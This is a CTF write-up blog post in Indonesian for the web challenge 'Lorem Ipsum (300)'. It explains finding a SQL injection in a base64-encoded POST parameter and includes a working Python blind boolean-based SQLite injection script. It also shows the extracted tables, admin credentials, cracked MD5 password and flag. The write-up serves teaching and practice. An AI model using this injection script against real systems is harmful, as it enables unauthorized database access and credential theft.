---
author: cacadosman
date: 2018-07-24 14:30:19+00:00
draft: false
title: WriteUp SQLi BTP - Lorem Ipsum (300)
type: post
url: /writeup-sqli-btp-lorem-ipsum-300/
comments: true
categories:
- CTF
- Cyber Security
- Tutorial
---

Terdapat sebuah web yang sekilas terlihat biasa saja, namun saat kita memcoba mengakses hyperlink, ternyata menggunakan ajax. Sampai disini kita curiga bahwa terdapat vuln SQLi pada url api yang menggunakan ajax, sehingga dengan menggunakan HTTP Trace kita dapat mengetahui url api nya.

![](/wp-content/2018/07/btpsqli.png)


Yaitu pada **data.php **dan kita bisa memasukkan inputan pada parameter id dengan metode post, namun inputan harus dalam bentuk base64. Lalu kita coba kirimkan sebuah payload ke url tsb:

![](/wp-content/2018/07/btpsqli2.png)


Ternyata saat kita inputkan “1 or 1 -- -” terdapat sebuah results yang menandakan bahwa vuln terhadap SQL Injection.
Setelah kita analisa ternyata menggunakan SQLite dan query union ternyata difilter juga sehingga kita terpaksa menggunakan teknik Blind Boolean Based.

kita perlu mencari nama tabel, kolom, dan value nya dengan menggunakan script berikut:


```python
from requests import *
import base64

url = "http://35.187.236.126:8013/data.php"
charlist = "abcdefghijklmnopqrstuvwxyz1234567890 _,)(:}{\n"
temp = []
while(True):
   temp += ["a"]
   for i in range(len(charlist)):
       temp[-1] = charlist[i]
       res = "".join(temp)
       #payload = "(select CASE WHEN (SELECT group_concat(tbl_name,':') FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') like '" + res + "%' THEN 1 ELSE 0 END)"
       #payload = "(select CASE WHEN (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%') like '" + res + "%' THEN 1 ELSE 0 END)"
       payload = "(select CASE WHEN (select group_concat(admin_id) from n1mbusadmin) like '" + res + "%' THEN 1 ELSE 0 END)"
       p64 = base64.b64encode(payload)
       r = post(url, data={"id":p64})
       if "Lorem Ipsum" in r.text:
           print res
           break
       else:
           print res
```



Dengan menggunakan script diatas kita bisa mengetahui nama tabel, kolom, dan value nya. Sehingga kita mendapatkan hasil:


    Tabel: config, n1mbusadmin, news
    Kolom: 
    - config : admin_url
    - n1mbusadmin : op, admin_id, admin_pass
    - news : news_id, content
    Value:
    - admin_url : 1n1admbr0
    - admin_id : backupuser
    - admin_pass : a5b6e34b25f4722b811d371e957aea29


Karena admin_pass masih berupa md5hash sehingga kita perlu meng-unhash pada website ternama seperti hashki*ller sehingga kita mendapatkan admin_pass sesungguhnya yaitu:


<blockquote>linkinpark</blockquote>


Oke, saatnya mengeksekusi. kita mendapatkan admin_url, sehingga kita bisa mencoba untuk mengakses url tsb:


<blockquote>http://35.187.236.126:8013/1n1admbr0/</blockquote>


![](/wp-content/2018/07/btpsqli3.png)


Maka muncul login form dan langsung saja kita masukkan id dan passwordnya dan VOILA kita mendapatkan sebuah FLAG

**FLAG: B2P{af39e6e718f3fb8f2de9ae9e6464b150}**
